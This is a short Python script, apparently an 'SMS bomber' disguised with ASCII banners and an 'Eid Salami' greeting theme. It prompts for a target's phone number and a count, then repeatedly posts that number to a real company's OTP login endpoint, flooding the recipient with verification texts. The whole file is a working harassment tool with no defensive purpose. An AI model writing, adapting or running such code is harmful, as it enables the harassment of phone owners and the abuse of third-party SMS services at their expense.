import requests
import sys
import os
import time

red='\033[1;91m'
white='\033[1;97m'
green='\033[1;32m' 
yellow='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;35m'

def sprint(s):
	for c in s+"\n":
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(10/3000)

sprint(cyan+"============================================================")

sprint(red+"============================================================")

sprint(yellow+"""
  _      _ _   _   _             ____              
 | |    (_) | | | | |           |  _ \             
 | |     _| |_| |_| | ___ ______| |_) | ___  _   _ 
 | |    | | __| __| |/ _ \______|  _ < / _ \| | | |
 | |____| | |_| |_| |  __/      | |_) | (_) | |_| |
 |______|_|\__|\__|_|\___|      |____/ \___/ \__, |
                                              __/ |
                                             |___/ 
""")

sprint(cyan+"============================================================")
sprint(red+"============================================================")

time.sleep(3)
os.system("clear")


sprint(green+"============================================================")

sprint(red+"============================================================")


sprint(green+"""
  ______ _     _        _____       _                 _ 
 |  ____(_)   | |      / ____|     | |               (_)
 | |__   _  __| |_____| (___   __ _| | __ _ _ __ ___  _ 
 |  __| | |/ _` |______\___ \ / _` | |/ _` | '_ ` _ \| |
 | |____| | (_| |      ____) | (_| | | (_| | | | | | | |
 |______|_|\__,_|     |_____/ \__,_|_|\__,_|_| |_| |_|_|
                                                        
                                                        
""")



sprint(green+"============================================================")

sprint(red+"============================================================")

num=str(input(green+"\n[ENTER-THE-RECHIVER'S NUMBER] = "+red))

salami=int(input(yellow+"\n[ENTER-AN-EID-SALAMI] = "+green))
time.sleep(3)
os.system("clear")

api="https://portal.flipper.com.bd/api/v1/send-otp/login"

data={"mobile_number":num}

for x in range(salami):
	n=([x+1])
	nn=str(n)
	requests.post(api,data=data)
	print(nn+"-[SALAMI]-[SENT]")